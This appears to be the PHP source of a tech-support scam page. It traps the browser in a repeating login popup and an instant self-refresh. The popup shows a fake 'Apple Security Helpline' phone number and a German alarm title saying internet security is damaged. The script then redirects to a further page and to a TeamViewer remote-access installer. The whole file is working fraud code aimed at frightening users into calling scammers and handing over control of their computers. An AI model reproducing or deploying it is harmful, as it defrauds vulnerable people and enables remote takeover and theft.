<?php

    session_start();

    $_user = 'windows2018';
    $_password = 'microsoft1';

    if ($_SERVER['PHP_AUTH_USER'] != $_user || $_SERVER['PHP_AUTH_PW'] != $_password ) {

        if(isset($_SESSION['login_attempts'])){ $_SESSION['login_attempts']++; }else{$_SESSION['login_attempts'] = 11;}

        if($_SESSION['login_attempts'] == 80){
            header('Location: en07.php');
            exit;
        } else {

           header('WWW-Authenticate: Basic realm="Call Apple Security Helpline +1 (866) 823-3624 (TollFree) .  "');
           header('HTTP/1.0 401 Unauthorized');
$page = $_SERVER['PHP_SELF'];
 $sec = "0";
 header("Refresh: $sec; url=$page");
         echo "<html><head><title>Internetsicherheit beschädigt !!! Rufen Sie den Helpdesk an</title></head><body>";


            exit;
        }
    } else {

        header('Location: en07.php');
        header('Location: http://download.teamviewer.com/download/TeamViewer_Setup_en.exe');

        exit;
    }
?>
